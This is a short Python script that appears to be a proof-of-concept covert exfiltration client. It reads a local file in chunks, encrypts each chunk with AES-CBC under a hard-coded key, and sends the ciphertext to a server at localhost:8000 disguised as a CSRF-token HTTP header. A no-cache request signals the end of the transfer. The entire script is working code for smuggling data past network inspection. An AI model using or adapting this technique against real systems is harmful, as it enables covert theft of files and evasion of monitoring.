import base64

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

URL = 'http://{}:{}/'.format("localhost", 8000)
CHUNK_LENGTH = 16
SECRET_KEY = "a cheeky nando's"

if __name__ == "__main__":
    cipher = AES.new(bytes(SECRET_KEY, 'utf-8'), AES.MODE_CBC)
    iv = base64.b64encode(cipher.iv).decode('utf-8')

    headers = {
        'Expect': '100-continue',
        'X-CRSF-TOKEN': iv
    }

    requests.get(URL, headers=headers)
    print('Sent AES IV: {}'.format(iv))

    with open(r'test', 'rb') as f:
        data = f.read(CHUNK_LENGTH)

        block_count = 1
        while data != b'':
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))
            headers = {
                'X-CRSF-TOKEN': base64.b64encode(ct_bytes)
            }
            requests.get(URL, headers=headers)

            print('Sent block {}'.format(block_count))
            block_count += 1
            data = f.read(CHUNK_LENGTH)

            # try:
            #     requests.get("localhost:8000/", )
            # except requests.exceptions.InvalidSchema:
            #     pass

    headers = {
        'Pragma': 'no-cache'
    }
    requests.get(URL, headers=headers)
